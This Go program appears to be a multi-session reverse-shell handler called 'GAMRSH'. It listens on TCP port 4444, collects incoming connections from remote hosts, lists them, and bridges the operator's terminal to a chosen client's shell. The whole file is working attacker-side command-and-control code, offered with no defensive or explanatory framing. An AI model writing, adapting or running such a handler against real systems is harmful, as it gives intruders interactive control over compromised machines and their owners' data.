package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
)

var cList []net.Conn
var nameList []string
var host *string = flag.String("host", ":4444", "to accept")
var stdin *bufio.Reader = bufio.NewReader(os.Stdin)

func main() {
	flag.Parse()
	go listen()
	for {
		var command string

		// Taking input from user
		fmt.Print("GAMRSH>")
		command, err := stdin.ReadString('\n')
		command = strings.Trim(command, "\n")
		if err != nil {
			panic(err)
		}

		if strings.HasPrefix(command, "s") {
			index, err := strconv.Atoi(string(command[len(command)-1]))
			if err != nil {
				fmt.Println("Please enter a valid number!")
				fmt.Errorf(err.Error())
			}
			ch := make(chan bool)
			setupLeaveHandler(ch)
			handle(cList[index], ch)
			fmt.Println("Disconnected from client.")

		} else if command == "quit" {
			fmt.Println("Quitting...")
			os.Exit(0)
		} else if command == "l" {
			for i := range cList {
				fmt.Printf("%d: %s (%s)\n", i, cList[i].RemoteAddr().String(), nameList[i])
			}

		}

	}
}

func listen() {
	// listen on port 4444
	ln, err := net.Listen("tcp", *host)

	if err != nil {
		panic(err)
	}
	defer ln.Close()
	for {
		//accept connection
		c, err := ln.Accept()

		if err != nil {
			panic(err)
		}
		name, err := bufio.NewReader(c).ReadString('\n')
		if err != nil {
			continue
		}
		name = strings.Trim(name, "\n")
		nameList = append(nameList, name)
		fmt.Printf("New client connected: %s (%s)\n", c.RemoteAddr().String(), name)
		cList = append(cList, c)

	}
}

func handle(c net.Conn, ch chan bool) {
	go stdout(c, ch)

	for {
		select {
		default:
		case <-ch:
			return
		}

		if _, err := io.CopyN(c, os.Stdin, 4); err != nil {
			ch <- true
			return
		}

	}

}
func stdout(c net.Conn, ch chan bool) {

	for {
		select {
		default:
		case <-ch:
			return
		}

		if _, err := io.CopyN(os.Stdout, c, 4); err != nil {
			ch <- true
			return
		}
	}

}
func setupLeaveHandler(ch chan bool) {
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		ch <- true

	}()
}
